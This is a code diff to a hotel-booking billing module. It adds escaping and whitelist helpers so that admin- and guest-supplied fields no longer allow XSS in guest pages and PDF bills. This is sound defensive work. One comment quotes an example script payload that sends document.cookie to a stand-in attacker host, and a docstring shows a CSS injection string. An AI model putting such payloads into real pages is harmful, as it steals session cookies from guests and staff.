@@ -1,9 +1,79 @@
-import httpx, base64, secrets, time, logging
+import html as _html
+import httpx, base64, re, secrets, time, logging
 from datetime import datetime
 import pytz
 
 logger = logging.getLogger(__name__)
 IST = pytz.timezone("Asia/Kolkata")
+
+
+# ── HTML / CSS / URL sanitization helpers ──────────────────────────────────
+# Hotel branding fields (hotel_name, tagline, primary_color, logo_url, …) are
+# admin-controlled and were previously interpolated raw into HTML templates
+# in services/helpers.build_bill_html and routes/guest_pages.themed. A
+# malicious tagline like  </style><script>fetch('//attacker?'+document.cookie)
+# </script>  rendered to every guest hitting /register/{slug} or downloading
+# their PDF bill. The helpers below escape the value for the destination
+# context (HTML element/attribute, CSS color, font name, URL).
+#
+# Anywhere a hotel- or guest-controlled string is interpolated into HTML/CSS
+# from now on, route the value through one of these.
+
+_HEX_COLOR_RE = re.compile(r"^#[0-9A-Fa-f]{3,8}$")
+_FONT_NAME_RE = re.compile(r"^[A-Za-z0-9 \-]{1,40}$")
+_SAFE_URL_SCHEMES = ("http://", "https://", "mailto:", "tel:")
+
+
+def html_escape(value) -> str:
+    """Escape for HTML element text or quoted attribute value.
+
+    Returns "" for None to keep optional fields tidy. `quote=True` so this is
+    safe inside `<x attr="...">` as well.
+    """
+    if value is None:
+        return ""
+    return _html.escape(str(value), quote=True)
+
+
+def safe_color(value, default: str) -> str:
+    """Allow only #RGB/#RRGGBB/#RRGGBBAA hex; otherwise fall back to default.
+
+    CSS injection (`#fff;}body{display:none`) was viable when these were
+    interpolated raw into a `<style>` block. The default itself is also
+    validated so callers can't accidentally pass a non-hex literal.
+    """
+    s = "" if value is None else str(value).strip()
+    if _HEX_COLOR_RE.match(s):
+        return s
+    if _HEX_COLOR_RE.match(default or ""):
+        return default
+    return "#000000"
+
+
+def safe_font(value, default: str = "Outfit") -> str:
+    """Strict whitelist for Google-Font-style names: letters / digits / space / `-`.
+
+    The result is safe inside both a CSS rule and the Google Fonts URL query
+    string. Anything else falls back to `default`.
+    """
+    s = "" if value is None else str(value).strip()
+    return s if _FONT_NAME_RE.match(s) else default
+
+
+def safe_url(value, default: str = "") -> str:
+    """Allow only http(s)/mailto/tel URLs; HTML-escape what we keep.
+
+    Strips javascript:, data:, vbscript:, file: and other schemes that
+    enable XSS when placed in an `href`/`src`. Empty / disallowed values
+    return `default` (which the caller is expected to keep trusted).
+    """
+    s = "" if value is None else str(value).strip()
+    if not s:
+        return default
+    lo = s.lower()
+    if any(lo.startswith(p) for p in _SAFE_URL_SCHEMES):
+        return _html.escape(s, quote=True)
+    return default
 
 def booking_id() -> str:
     """Generate a non-predictable booking id.
@@ -67,19 +137,25 @@ async def html_to_pdf_b64(html: str, gotenberg_url: str) -> str:
 
 def build_bill_html(booking: dict, charges: list, hotel: dict) -> str:
     now = datetime.now(IST).strftime("%d %b %Y %I:%M %p")
-    name = booking.get("guest_name","Guest")
-    room = booking.get("room_number","")
-    bid  = booking.get("booking_id","")
-    ci   = fmt_date(booking.get("checkin_date"))
-    co   = fmt_date(booking.get("checkout_date"))
-    hn   = hotel.get("hotel_name","Hotel")
-    logo = hotel.get("logo_url","")
-    pri  = hotel.get("primary_color","#c8a84b")
-    sec  = hotel.get("secondary_color","#1a2942")
-    addr = hotel.get("address","")
-    city = hotel.get("city","")
-    ph   = hotel.get("hotel_whatsapp") or hotel.get("emergency_number","")
-    tag  = hotel.get("tagline","")
+    # ── Sanitize all hotel- and booking-controlled strings before they hit
+    # the f-string. Hotel fields are admin-editable, booking fields contain
+    # guest-supplied data (name, customer_gstin). Without escaping, a guest
+    # who typed `</style><script>…</script>` as their name would XSS the
+    # PDF / preview that staff downloads.
+    name = html_escape(booking.get("guest_name", "Guest"))
+    room = html_escape(booking.get("room_number", ""))
+    bid  = html_escape(booking.get("booking_id", ""))
+    ci   = html_escape(fmt_date(booking.get("checkin_date")))
+    co   = html_escape(fmt_date(booking.get("checkout_date")))
+    payment_mode = html_escape(booking.get("payment_mode", "—"))
+    hn   = html_escape(hotel.get("hotel_name", "Hotel"))
+    logo = safe_url(hotel.get("logo_url", ""))
+    pri  = safe_color(hotel.get("primary_color"), "#c8a84b")
+    sec  = safe_color(hotel.get("secondary_color"), "#1a2942")
+    addr = html_escape(hotel.get("address", ""))
+    city = html_escape(hotel.get("city", ""))
+    ph   = html_escape(hotel.get("hotel_whatsapp") or hotel.get("emergency_number", ""))
+    tag  = html_escape(hotel.get("tagline", ""))
 
     by_date: dict = {}
     grand = paid = 0.0
@@ -101,12 +177,14 @@ def build_bill_html(booking: dict, charges: list, hotel: dict) -> str:
     rows = ""
     for dk in sorted(by_date.keys()):
         dt = sum(float(c.get("total",0)) for c in by_date[dk])
-        rows += f'<tr class="dh"><td colspan="4">{fmt_date(dk)}</td><td style="text-align:right">₹{dt:,.0f}</td></tr>'
+        rows += f'<tr class="dh"><td colspan="4">{html_escape(fmt_date(dk))}</td><td style="text-align:right">₹{dt:,.0f}</td></tr>'
         for c in by_date[dk]:
             ic = "✓" if c.get("payment_status")=="Paid" else "●"
-            hsn = c.get("hsn_code") or ""
-            rows += (f'<tr><td><span class="tg">{c.get("service_type","")}</span></td>'
-                     f'<td>{c.get("description","")}</td>'
+            hsn = html_escape(c.get("hsn_code") or "")
+            svc_type = html_escape(c.get("service_type", ""))
+            svc_desc = html_escape(c.get("description", ""))
+            rows += (f'<tr><td><span class="tg">{svc_type}</span></td>'
+                     f'<td>{svc_desc}</td>'
                      f'<td style="text-align:center;font-family:monospace;font-size:10px;color:#888">{hsn}</td>'
                      f'<td style="text-align:center">{ic}</td>'
                      f'<td style="text-align:right">₹{float(c.get("total",0)):,.0f}</td></tr>')
@@ -117,8 +195,8 @@ def build_bill_html(booking: dict, charges: list, hotel: dict) -> str:
     logo_h = f'<img src="{logo}" style="height:55px;object-fit:contain;margin-bottom:7px"><br>' if logo else ""
 
     # B2B / GST: if hotel has GSTIN configured, render this as a TAX INVOICE.
-    seller_gstin   = (hotel.get("gstin") or "").strip()
-    customer_gstin = (booking.get("customer_gstin") or "").strip()
+    seller_gstin   = html_escape((hotel.get("gstin") or "").strip())
+    customer_gstin = html_escape((booking.get("customer_gstin") or "").strip())
     invoice_kind = "TAX INVOICE" if seller_gstin else "GUEST FOLIO"
     seller_gstin_html = (
         f'<div style="font-size:11px;color:#666;margin-top:2px"><b>GSTIN:</b> {seller_gstin}</div>'
@@ -178,7 +256,7 @@ td{{padding:6px 7px;border-bottom:1px solid #eee;font-size:12px;}}
   <div class="ib"><label>Check-in</label><p>{ci}</p></div>
   <div class="ib"><label>Check-out</label><p>{co}</p></div>
   <div class="ib"><label>Booking ID</label><p style="font-family:monospace;font-size:11px">{bid}</p></div>
-  <div class="ib"><label>Payment</label><p>{booking.get("payment_mode","—")}</p></div>
+  <div class="ib"><label>Payment</label><p>{payment_mode}</p></div>
   {customer_gstin_box}
 </div>
 <table>
